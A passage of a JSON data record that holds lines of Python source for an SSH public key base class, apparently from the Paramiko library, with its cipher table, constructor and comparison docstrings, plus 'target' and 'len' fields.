      "    \"\"\"\n",
      "    Base class for public keys.\n",
      "    \"\"\"\n",
      "\n",
      "    # known encryption types for private key files:\n",
      "    _CIPHER_TABLE = {\n",
      "        'AES-128-CBC': {'cipher': AES, 'keysize': 16, 'blocksize': 16, 'mode': AES.MODE_CBC},\n",
      "        'DES-EDE3-CBC': {'cipher': DES3, 'keysize': 24, 'blocksize': 8, 'mode': DES3.MODE_CBC},\n",
      "    }\n",
      "\n",
      "    def __init__(self, msg=None, data=None):\n",
      "        \"\"\"\n",
      "        Create a new instance of this public key type.  If ``msg`` is given,\n",
      "        the key's public part(s) will be filled in from the message.  If\n",
      "        ``data`` is given, the key's public part(s) will be filled in from\n",
      "        the string.\n",
      "\n",
      "        :param .Message msg:\n",
      "            an optional SSH `.Message` containing a public key of this type.\n",
      "        :param str data: an optional string containing a public key of this type\n",
      "\n",
      "        :raises SSHException:\n",
      "            if a key cannot be created from the ``data`` or ``msg`` given, or\n",
      "            no key was passed in.\n",
      "        \"\"\"\n",
      "        pass\n",
      "\n",
      "    def asbytes(self):\n",
      "        \"\"\"\n",
      "        Return a string of an SSH `.Message` made up of the public part(s) of\n",
      "        this key.  This string is suitable for passing to `__init__` to\n",
      "        re-create the key object later.\n",
      "        \"\"\"\n",
      "        return bytes()\n",
      "\n",
      "    def __str__(self):\n",
      "        return self.asbytes()\n",
      "\n",
      "    # noinspection PyUnresolvedReferences\n",
      "    def __cmp__(self, other):\n",
      "        \"\"\"\n",
      "        Compare this key to another.  Returns 0 if this key is equivalent to\n",
      "        the given key, or non-0 if they are different.  Only the public parts\n",
      "        of the key are compared, so a public key will compare equal to its\n",
      "        corresponding private key.\n",
      "\n",
      "        :param .Pkey other: key to compare to.\n",
      "        \"\"\"\n"
    ],
    "target": 40,
    "len": 3
  }
]